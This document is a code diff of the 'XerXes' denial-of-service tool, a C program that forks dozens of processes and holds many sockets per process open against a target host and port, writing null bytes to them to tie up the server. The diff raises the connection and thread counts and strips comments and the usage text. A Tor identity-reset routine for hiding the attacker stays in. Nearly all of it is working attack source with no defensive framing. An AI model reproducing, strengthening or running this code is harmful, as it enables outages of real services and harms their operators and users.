@@ -1,5 +1,4 @@
-//Xerxes, code assumed to be public domain
-//by tH3j3st3r
+/* XerXes - Most powerful dos tool - THN (http://www.thehackernews.com) */
 
 #include <stdio.h>
 #include <stdlib.h>
@@ -12,20 +11,13 @@
 #include <sys/types.h>
 #include <netinet/in.h>
 #include <arpa/inet.h>
-#include "config.h"
 
-extern int attacks = 0;
-
-/*
- * This function just abstracts sockets to an easier way of calling them.
- */
 int make_socket(char *host, char *port) {
 	struct addrinfo hints, *servinfo, *p;
 	int sock, r;
 //	fprintf(stderr, "[Connecting -> %s:%s\n", host, port);
 	memset(&hints, 0, sizeof(hints));
 	hints.ai_family = AF_UNSPEC;
-//	hints.ai_socktype = SOCK_DGRAM;
 	hints.ai_socktype = SOCK_STREAM;
 	if((r=getaddrinfo(host, port, &hints, &servinfo))!=0) {
 		fprintf(stderr, "getaddrinfo: %s\n", gai_strerror(r));
@@ -44,31 +36,22 @@ int make_socket(char *host, char *port) {
 	if(p == NULL) {
 		if(servinfo)
 			freeaddrinfo(servinfo);
-		fprintf(stderr, "No connection could be made to %s:%s\n", host, port);
+		fprintf(stderr, "No connection could be made\n");
 		exit(0);
 	}
 	if(servinfo)
 		freeaddrinfo(servinfo);
-	//fprintf(stderr, "[Connected -> %s:%s]\n", host, port);
+	fprintf(stderr, "[Connected -> %s:%s]\n", host, port);
 	return sock;
 }
 
-
-/*
- * Generic stop function
- */
 void broke(int s) {
 	// do nothing
 }
 
-#define CONNECTIONS 40
-#define THREADS 65
+#define CONNECTIONS 64
+#define THREADS 90
 
-/*
- * This function will send a null character to the
- * target site, which wastes the daemon's time, and is
- * why this program works.
- */
 void attack(char *host, char *port, int id) {
 	int sockets[CONNECTIONS];
 	int x, g=1, r;
@@ -80,23 +63,18 @@ void attack(char *host, char *port, int id) {
 			if(sockets[x] == 0)
 				sockets[x] = make_socket(host, port);
 			r=write(sockets[x], "\0", 1);
-			//r=write(sockets[x], "GET / HTTP/1.1\r\n\r\n", 1);
 			if(r == -1) {
-				close(sockets[x]); 
+				close(sockets[x]);
 				sockets[x] = make_socket(host, port);
-			} else {
+			} else
 //				fprintf(stderr, "Socket[%i->%i] -> %i\n", x, sockets[x], r);
-			}
-			attacks++;
-			fprintf(stderr, "[%i:\tvolley sent, %d\t]\n", id, attacks);
+			fprintf(stderr, "[%i: Voly Sent]\n", id);
 		}
+		fprintf(stderr, "[%i: Voly Sent]\n", id);
 		usleep(300000);
 	}
 }
 
-/*
- * This function will reset your tor identity, VERY USEFUL
- */
 void cycle_identity() {
 	int r;
 	int socket = make_socket("localhost", "9050");
@@ -110,12 +88,8 @@ void cycle_identity() {
 
 int main(int argc, char **argv) {
 	int x;
-	if(argc !=3) {
-		printf("xerxes Usage Summary:\n%s [site to kill] [port, 80 is best]\nYour tor identity has been reset\n\n", argv[0]);
+	if(argc !=3)
 		cycle_identity();
-		
-		return 0;
-	}
 	for(x=0; x != THREADS; x++) {
 		if(fork())
 			attack(argv[1], argv[2], x);
